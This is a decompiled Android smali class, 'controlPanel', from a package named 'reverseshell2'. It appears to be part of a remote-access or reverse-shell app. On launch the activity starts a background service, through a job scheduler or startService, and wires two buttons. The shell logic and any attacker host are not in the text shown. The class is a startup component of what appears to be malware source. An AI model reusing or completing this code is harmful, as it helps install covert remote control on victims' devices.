.class public Lcom/example/reverseshell2/controlPanel;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "controlPanel.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 16
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 17
    const v0, 0x7f09001c

    invoke-virtual {p0, v0}, Lcom/example/reverseshell2/controlPanel;->setContentView(I)V

    .line 18
    move-object v0, p0

    .line 20
    .local v0, "activity":Landroid/app/Activity;
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-lt v1, v2, :cond_0

    .line 21
    new-instance v1, Lcom/example/reverseshell2/functions;

    invoke-direct {v1, v0}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    invoke-virtual {p0}, Lcom/example/reverseshell2/controlPanel;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_0

    .line 23
    :cond_0
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/example/reverseshell2/controlPanel;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/example/reverseshell2/mainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 27
    :goto_0
    const v1, 0x7f070090

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/controlPanel;->findViewById(I)Landroid/view/View;

    move-result-object v1

    new-instance v2, Lcom/example/reverseshell2/controlPanel$1;

    invoke-direct {v2, p0}, Lcom/example/reverseshell2/controlPanel$1;-><init>(Lcom/example/reverseshell2/controlPanel;)V

    invoke-virtual {v1, v2}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 38
    const v1, 0x7f07005e

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/controlPanel;->findViewById(I)Landroid/view/View;

    move-result-object v1

    new-instance v2, Lcom/example/reverseshell2/controlPanel$2;

    invoke-direct {v2, p0, v0}, Lcom/example/reverseshell2/controlPanel$2;-><init>(Lcom/example/reverseshell2/controlPanel;Landroid/app/Activity;)V

    invoke-virtual {v1, v2}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 51
    return-void
.end method
